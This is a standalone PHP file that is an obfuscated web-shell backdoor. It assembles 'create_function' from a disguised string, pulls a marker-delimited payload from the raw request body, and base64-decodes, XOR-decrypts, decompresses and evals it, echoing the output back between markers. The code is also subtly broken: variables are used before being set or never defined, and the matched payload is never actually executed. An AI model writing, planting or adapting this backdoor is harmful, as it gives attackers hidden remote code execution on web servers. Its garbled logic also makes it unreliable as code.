<?php
$k = "da26da04";
$kh = "0afa196900ca";
$kf = "071500dfa75f";
$p = "T0FOBJaNtmib2CL1";

function x($t, $k) {
    $c = strlen($k);
    $l = strlen($t);
    $o = "";
    for ($i = 0; $i < $l; ) {
        for ($j = 0; $j < $c && $i < $l; $j++, $i++) {
            $o .= $t{$i} ^ $k{$j};
        }
    }
    return $o;
}

$t = str_replace('yU', '', 'cyUryUeatyUe_fuyUyUnctyUion');
$o = $t('', $o);
$m = preg_match("/$kh(.+)$kf/", @file_get_contents("php://input"), $m);
if ($m == 1) {
    @ob_start();
    @eval(@gzuncompress(@x(@base64_decode($o), $k)));
    $o = @ob_get_contents();
    @ob_end_clean();
    print("$p$kh$r$kf");
}
?>
